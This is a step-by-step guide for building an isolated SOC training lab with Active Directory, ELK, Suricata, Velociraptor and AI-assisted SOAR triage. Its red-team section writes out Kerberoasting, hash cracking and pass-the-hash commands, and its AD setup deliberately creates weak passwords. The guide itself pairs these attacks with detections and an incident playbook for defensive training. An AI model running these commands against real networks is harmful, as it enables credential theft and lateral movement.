# Zero to Hero: Comprehensive SOC Lab Implementation & Operations Guide

Welcome to the ultimate "Zero to Hero" guide for your SOC (Security Operations Center) lab. This guide takes you through the entire lifecycle of building, operating, attacking, and defending a modern SOC environment.

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [Lab Architecture Overview](#2-lab-architecture-overview)
3. [Phase 1: Infrastructure & Environment Setup](#3-phase-1-infrastructure--environment-setup)
4. [Phase 2: Core SOC Tooling Implementation](#4-phase-2-core-soc-tooling-implementation)
5. [Phase 3: Advanced Detection & Automation (AI/SOAR)](#5-phase-3-advanced-detection--automation-aisoar)
6. [Phase 4: Attack Scenarios (Red Team)](#6-phase-4-attack-scenarios-red-team)
7. [Phase 5: Investigation & Threat Hunting (Blue Team)](#7-phase-5-investigation--threat-hunting-blue-team)
8. [Phase 6: DFIR & Incident Playbooks](#8-phase-6-dfir--incident-playbooks)

---

## 1. Learning Objectives

By completing this lab, you will learn to:
*   **Architect & Deploy** a segmented enterprise network using pfSense, VLANs, and Active Directory.
*   **Build a SIEM** from scratch using the ELK stack (Elasticsearch, Kibana, Logstash).
*   **Configure Telemetry** via Sysmon, Winlogbeat, Elastic Agent, and Suricata IDS.
*   **Execute Cyber Attacks** (MITRE ATT&CK) including Reconnaissance, Kerberoasting, and Pass-the-Hash.
*   **Automate Triage** using AI (Ollama/Llama3) and SOAR (Shuffle) to reduce alert fatigue.
*   **Investigate Incidents** using TheHive, Cortex, OpenCTI, and Velociraptor.
*   **Perform Forensics** using SIFT workstation and Volatility.

---

## 2. Lab Architecture Overview

Your lab is hosted on VMware ESXi and segmented via a **pfSense firewall** with no physical uplinks (completely isolated). 

**VLAN Segmentation:**
*   **MGMT (VLAN 10):** SOC Tools (ELK, TheHive, Velociraptor, OpenCTI, AI/SOAR, Forensics).
*   **CORP (VLAN 20):** Active Directory (DC01), Windows Targets.
*   **DMZ (VLAN 30):** Vulnerable Linux Target.
*   **ATTACKER (VLAN 99):** Kali Linux (isolated, attacks go through pfSense).
*   **MONITOR (VLAN 4095):** Promiscuous mode port group for Suricata IDS to sniff all inter-VLAN traffic.

---

## 3. Phase 1: Infrastructure & Environment Setup

### 3.1. pfSense Configuration (Router/Firewall)
pfSense is the core router. Create interfaces for each VLAN and set up rules.
*   **Rule 1:** Allow Kali (VLAN 99) to reach CORP/DMZ (VLAN 20/30) for attacks.
*   **Rule 2:** Block CORP/DMZ from reaching Kali.
*   **Rule 3:** Allow Windows/Linux targets to reach Logstash (VLAN 10, Port 5044).

### 3.2. Active Directory Setup (DC01 - 172.16.20.10)
Set up the vulnerable domain environment.
```powershell
# Install AD DS and Promote to Domain Controller
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "lab.local" -DomainNetbiosName "LAB" -InstallDns:$true -Force:$true

# Create users
New-ADUser -Name "alice.dupont" -SamAccountName "alice.dupont" -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -Enabled $true
New-ADUser -Name "bob.admin" -SamAccountName "bob.admin" -AccountPassword (ConvertTo-SecureString "Admin@123" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "bob.admin"

# Create vulnerable SPN account for Kerberoasting
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" -AccountPassword (ConvertTo-SecureString "Service123!" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/dc01.lab.local:1433"}
```

---

## 4. Phase 2: Core SOC Tooling Implementation

### 4.1. ELK Stack (172.16.10.10)
The central SIEM. Install Elasticsearch, Kibana, and Logstash.
```bash
# Install Logstash and configure Beats input
sudo apt install -y logstash
sudo nano /etc/logstash/conf.d/beats-input.conf
```
*Configure Logstash to listen on port 5044 and output to Elasticsearch.*

### 4.2. Windows Telemetry (Sysmon & Winlogbeat)
Install on DC01 and Windows targets.
```powershell
# Install Sysmon with SwiftOnSecurity config
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "sysmonconfig.xml"
.\Sysmon64.exe -accepteula -i sysmonconfig.xml

# Install Winlogbeat
cd "C:\Program Files\Winlogbeat\winlogbeat-8.13.0-windows-x86_64"
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
.\install-service-winlogbeat.ps1
Start-Service winlogbeat
```
*(Ensure `winlogbeat.yml` points to Logstash: `hosts: ["172.16.10.10:5044"]`)*

### 4.3. Suricata IDS (172.16.10.40)
Sniffs traffic on VLAN 4095.
```bash
sudo apt install -y suricata
# Edit /etc/suricata/suricata.yaml to listen on the monitor interface (e.g., ens36)
sudo suricata-update
sudo systemctl enable --now suricata
```

---

## 5. Phase 3: Advanced Detection & Automation (AI/SOAR)

### 5.1. Velociraptor (172.16.10.50)
For live endpoint forensics.
```bash
# Generate config and start server
velociraptor config generate -i
velociraptor --config server.config.yaml frontend &
```

### 5.2. AI Automation (Shuffle SOAR + Ollama) (172.16.10.90)
Automate triage without sending data to the cloud.
```bash
# Install Ollama and Llama3 Model
curl -fsSL https://ollama.ai/install.sh | sh
ollama pull llama3:8b

# Install Shuffle
git clone https://github.com/Shuffle/Shuffle /opt/shuffle
cd /opt/shuffle
docker-compose up -d
```

### 5.3. SOAR Automation Workflow
1. **Trigger:** ELK sends webhook to Shuffle.
2. **AI Triage:** Shuffle asks Ollama to summarize the alert and score severity.
3. **Enrichment:** Shuffle queries OpenCTI and Cortex (VirusTotal/AbuseIPDB) for hashes/IPs.
4. **Action:** If severity >= 7, trigger Velociraptor hunt.
5. **Ticketing:** Create a fully enriched case in TheHive for the analyst.

---

## 6. Phase 4: Attack Scenarios (Red Team)

From Kali Linux (172.16.99.10).

### Scenario 1: Initial Reconnaissance
Map the AD environment.
```bash
# Nmap scan
nmap -sV -sC 172.16.20.0/24

# BloodHound AD Recon
bloodhound-python -u alice.dupont -p Password123 -d lab.local -ns 172.16.20.10 --zip
```

### Scenario 2: Kerberoasting
Extract and crack service tickets.
```bash
# Request SPN ticket
GetUserSPNs.py lab.local/alice.dupont:Password123 -dc-ip 172.16.20.10 -request

# Crack hash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### Scenario 3: Pass-the-Hash & Lateral Movement
Use a dumped NTLM hash to access another machine.
```bash
# Execute command via SMB
crackmapexec smb 172.16.20.31 -u bob.admin -H <hash_ntlm>

# Get an interactive shell
evil-winrm -i 172.16.20.31 -u bob.admin -H <hash_ntlm>
```

---

## 7. Phase 5: Investigation & Threat Hunting (Blue Team)

### 7.1. SIEM Detection (Kibana)
Look for these key Event IDs:
*   **Event ID 4769 (RC4 encryption):** Kerberoasting
*   **Event ID 4662 + LDAP port:** BloodHound Enumeration
*   **Event ID 4624 (Logon Type 3):** Pass-the-Hash / SMB Auth
*   **Sysmon Event 10 (Process Access):** Mimikatz touching LSASS

### 7.2. Threat Hunting with Velociraptor VQL
Hunt for lateral movement artifacts.
```sql
-- Search for active network connections to weird ports
SELECT Laddr, Lport, Raddr, Rport, Status, Pid FROM netstat() WHERE Raddr != "0.0.0.0"

-- Hunt for Mimikatz in memory or filesystem
SELECT FullPath, Size, Mtime, Hash.MD5 FROM glob(globs="C:\\**\\mimikatz*", accessor="file")
```

---

## 8. Phase 6: DFIR & Incident Playbooks

### 8.1. Incident Response Playbook: "Pass-The-Hash Detected"
1. **Identification:**
   * Alert triggers in ELK (Event 4624 Type 3).
   * Shuffle SOAR catches the webhook, enriches via Cortex, and uses Ollama to summarize: *"High severity alert: Unauthorized NTLM authentication detected from unknown source."*
   * Case is created in TheHive.
2. **Containment:**
   * Isolate the affected Windows Target using a Velociraptor VQL script.
   * Block the attacker IP in pfSense.
3. **Forensics (SIFT Workstation - 172.16.10.70):**
   * Take a memory snapshot (`.vmem`) of the compromised VM.
   * Analyze with Volatility 3:
     ```bash
     # Check for injected code or dumped credentials
     vol -f memory.vmem windows.malfind.Malfind
     vol -f memory.vmem windows.lsadump.Lsadump
     ```
4. **Eradication & Recovery:**
   * Reset the compromised user's password (e.g., `bob.admin`).
   * Reboot the machine.
5. **Lessons Learned:** Update Suricata rules and Kibana dashboards to catch earlier stages (like the initial Kerberoasting).

---
*Created as part of PFA 2026 SOC Architecture Project.*
